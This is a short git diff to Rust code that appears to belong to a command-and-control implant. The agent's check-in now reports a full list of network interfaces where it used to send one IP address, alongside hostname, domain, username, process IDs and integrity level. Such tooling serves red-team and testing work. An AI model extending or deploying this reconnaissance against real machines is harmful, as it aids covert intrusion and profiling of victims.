@@ -16,6 +16,7 @@ use mod_win32::{
 use rs2_communication_protocol::{
     communication_structs::checkin::{Checkin, PartialCheckin},
     metadata::Metadata,
+    network_interface::NetworkInterface,
 };
 
 use crate::common::utils::generate_request_id;
@@ -61,7 +62,7 @@ pub fn initialize_system_data() {
         }
 
         // Get network adapters information
-        let ip_addresses = get_adapters_info();
+        let network_interfaces = NetworkInterface::from_tuples(get_adapters_info().unwrap());
 
         // Get the process ID and parent process ID
         let (pid, ppid) = get_pid_and_ppid();
@@ -70,14 +71,15 @@ pub fn initialize_system_data() {
         let process_handle = -1isize as _;
         let rid = get_process_integrity(process_handle);
 
-        let first_ip = ip_addresses.unwrap().get_mut(0).unwrap().1.clone();
+        // Create a list of NetworkInterface object from the gathered IP addresses
+
         // Create a Checkin object with the gathered metadata
         let mut checkin = Box::new(Checkin::new(PartialCheckin {
             operative_system: operating_system,
             hostname: hostname,
             domain: get_user_domain(),
             username: get_username(),
-            ip: first_ip,
+            network_interfaces: network_interfaces,
             process_id: pid as i64,
             parent_process_id: ppid as i64,
             process_name: get_process_name(),
@@ -85,7 +87,7 @@ pub fn initialize_system_data() {
             cwd: get_image_path_name(),
         }));
 
-        // // Add metadata to the Checkin object
+        // Add metadata to the Checkin object
         let metadata = Metadata {
             request_id: generate_request_id(32),
             command_id: generate_request_id(32),
